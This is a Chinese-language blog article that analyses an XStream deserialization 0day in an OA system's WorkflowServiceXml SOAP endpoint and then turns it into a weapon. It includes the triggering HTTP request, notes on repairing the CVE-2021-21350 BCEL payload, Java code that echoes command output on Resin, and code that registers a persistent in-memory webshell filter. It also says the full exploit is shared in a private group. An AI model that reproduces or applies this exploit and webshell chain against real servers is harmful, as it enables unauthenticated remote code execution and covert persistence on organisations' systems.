> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iTP9jBypsJEsSlAIaNOnhw)

最近在逛论坛的时候，发现有一哥们求助在自己的设备上发现某 oa 的 0day 流量。恰好手头有该 OA 的源码，于是开始分析一下

漏洞分析
----

流量中 http 的请求如下

```
POST /services%20/WorkflowServiceXml HTTP/1.1Accept-Encoding: gzip, deflateContent-Type: text/xml;charset=UTF-8SOAPAction: ""Content-Length: 33003Host: : 192.168.190.128User-Agent: Apache-HttpClient/4.1.1 (java 1.5)Connection: close<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">   <soapenv:Header/>   <soapenv:Body>      <web:doCreateWorkflowRequest>    <web:string>
```

虽然不全，但是也足够我们去分析了。一般情况下`WEB-INF`文件夹的`web.xml`文件含有该 j2ee 项目的所有信息，包括哪个 servlet 对应到哪个 class 类。所以我们看下该文件，如下所示

```
<servlet>
   <servlet-name>XFireServlet</servlet-name>
   <display-name>XFire Servlet</display-name>
<servlet-class>org.codehaus.xfire.transport.http.XFireConfigurableServlet</servlet-class>
</servlet>

<servlet-mapping>
   <servlet-name>XFireServlet</servlet-name>
   <url-pattern>/services/*</url-pattern>
</servlet-mapping>
```

看来 url 的`services`对应`org.codehaus.xfire.transport.http.XFireConfigurableServlet`这个类。我们去分析一下这个类。在 servlet 中，你可以简单地认为 get 对应 doGet 方法，post 对应 doPost 方法。这个 poc 显然需要分析 doPost 方法。但是很显然，doPost 方法，最终交由 controller 去处理。对于 java 这种强类型的语言的项目，我们可以直接右键，点击 implement 方法直接跳转到该处理函数，如图![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFk6b2nVh1rh76jz1tHgVWje1lyasTMbw0KYOVc2WsfIuNK8QFgGRvOYXapkp6Hf17ibwts36Un2iag/640?wx_fmt=png)

doService 代码如下

```
public void doService(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {        String var3 = this.getService(var1);        if (var3 == null) {            var3 = "";        }        ServiceRegistry var4 = this.getServiceRegistry();        var2.setHeader("Content-Type", "UTF-8");        try {            requests.set(var1);            responses.set(var2);            boolean var5 = var4.hasService(var3);            if (var3.length() != 0 && var5) {                if (this.isWSDLRequest(var1)) {                    this.generateWSDL(var2, var3);                } else {                    this.invoke(var1, var2, var3);                }
```

getService 方法获取服务名，也就是 url 中 service 后面的内容，在该 poc 中是`WorkflowServiceXml`。然后调用 invoke 执行。

在漏洞分析中，我们需要大致走通流程，对于这种我们需要了解服务对应哪个类。

分析 invoke 方法，首先调用`getService`方法，查找 service 对应的处理类是什么。代码如下

```
protected Service getService(String var1) {        return this.getXFire().getServiceRegistry().getService(var1);    }
```

这时候我们已经很明显的知道，这是使用 xfire 框架开发的模块。在 xfire 框架中，使用`service.xml`文件描述 service 名称与处理类的关系。在该 oa 中，该文件如下![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFk6b2nVh1rh76jz1tHgVWjTukW5AYusibbFKphbKEYOCDrNzJguzShqeQhQsO2quu2BqWM7rcAqtQ/640?wx_fmt=png)

现在我们知道该 service 由`unicodesec.workflow.webservices.WorkflowServiceImplXml`来处理。而该 soap 消息，则是调用该类的某个方法和参数。在 invoke 方法中，其实是处理 soap 消息，然后根据 soap 消息调用相关方法。

在 poc 中，调用`doCreateWorkflowRequest`方法，我们看一下

```
    public String doCreateWorkflowRequest(String var1, int var2) {
        try {
            WorkflowRequestInfo var3 = (WorkflowRequestInfo)this.xmlutil1.xmlToObject(var1);
            var3 = this.getActiveWorkflowRequestInfo(var3);
```

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFk6b2nVh1rh76jz1tHgVWjTib5NQakLeY2eQ6OUROkvOpX7qW2Fp8qGL5lYKDMyPNVXZudqUiaYfRA/640?wx_fmt=png)

很明显的 xstream 反序列化漏洞，而且该 oa 的 xstream 版本较低。我们直接使用 xstream 官网提供的 poc 验证一下就可以。

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFk6b2nVh1rh76jz1tHgVWjYGXyRj0hNicmS3Osh61kbrE0nPMZMA8SICNDIrrDfq6o3APeya8zB3g/640?wx_fmt=png)

武器化利用
-----

我们肯定不满足于弹窗，所以我们就要研究 resin 服务器怎么回显以及怎么做内存马。

### 修复异常

在这里我们为了更好地满足不出网这个需求，使用 cve-2021-21350 这个 poc。这个 poc 其实是无法使用的，会一直报错 nullPointException。这个 poc 使用 bcel 这个 classloader，可以将类的字节码通过编码隐藏到类名中。但是怎么会有空指针异常错误呢。下面介绍一下排查思路以及方法。

根据给出的错误堆栈，下断点到相应的函数以及位置

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFk6b2nVh1rh76jz1tHgVWj5JV9yd2Yia10zqDbWWTgtnk09cX0nTTMpvnm1B6jAvHDPDogkWzLoqw/640?wx_fmt=png)

也就是`checkPackageAccess`方法，我们发现此时 domains 字段竟然为空。

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFk6b2nVh1rh76jz1tHgVWj7j1ssY8yoPeafgz5yszGPyz4IVtrhU3icvgeI0OKrNibK9CDFfRjmZRA/640?wx_fmt=png)

而根据 bcel 的 classloader 其实来源于 xstream 去反序列化 xml 得来。我们知道 xstream 会将被序列化的对象中所有字段通过 xml 来存储。如果某字段没有在 xml 中存储，则反序列化的时候该字段为 null。

问题找到了，下面讲一下怎么修复。首先通过 xstream 序列化一个正常的 bcel 的 classloader。然后从 xml 中摘出我们需要的字段的序列化 xml 片段，重组到 poc 中即可。如图![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFk6b2nVh1rh76jz1tHgVWjIXjuLS5Yr4Kt3RicpZkrhUebn1FoMSVDYibyZjnzIyklnS59Ndr7mVaQ/640?wx_fmt=png)

### 回显

既然我们想要做到武器化利用，肯定需要做该漏洞的回显，也就是将命令执行的结果输出到 http 的响应中。做回显，无非就是怎么找到本次 http 请求中 http 响应对象的位置。介绍一下思路

1.  Thread 中间件有可能将本次 response 对象和 request 对象存储在某一线程中，遍历直到找到该对象
    
2.  中间件可能将请求与响应的对象存储在某静态变量中
    

resin 这个中间件做回显简直太简单了。resin 将响应直接存储到静态变量，我们直接调用方法就可以获取。

代码如下

```
Class tcpsocketLinkClazz = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.network.listen.TcpSocketLink");            Method getCurrentRequestM = tcpsocketLinkClazz.getMethod("getCurrentRequest");            Object currentRequest = getCurrentRequestM.invoke(null);            Field f = currentRequest.getClass().getSuperclass().getDeclaredField("_responseFacade");            f.setAccessible(true);            Object response = f.get(currentRequest);            Method getWriterM = response.getClass().getMethod("getWriter");            Writer w = (Writer) getWriterM.invoke(response);            w.write("powered by potatso");
```

### 内存马

直接介绍一下 resin 内存马实现的思路

1.  找到 webContext 这个对象，在中间件中该对象存储 webapp 的所有信息，例如 servlet 与 url 的对应关系，filter 与 url 的对应关系。寻找这个对象的方法参考前面寻找 response 对象的方法。
    
2.  将我们自己的恶意 filter 通过 defineClass 方法添加到服务器的 classpath 中
    
3.  添加 filter 与 url pattern 的对应关系
    

在 resin 中，每个 webContext 存储在静态变量中。可以通过 WebApp 的 getCurrent 静态方法获取当前的 webcontext 对象。调用 addFilter 添加内存马即可。代码如下

```
FilterMapping mapping = new FilterMapping();mapping.setFilterName("fuckyou");mapping.setFilterClass("你的filter的全限定名");mapping.setWebApp(w);mapping.setServletContext(w);w.addFilter(mapping);FilterMapping.URLPattern url = mapping.createUrlPattern();url.init();url.addText("/*");w.addFilterMapping(mapping);
```

exp 已经上传至星球，有需要的同学自取

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdEjSODheHaAokPQRjTKp7tI2r4IYIUKcqDicftqmvObxd3vkwRhaODMias2tsGEt2InTSWd4p8sPezQ/640?wx_fmt=png)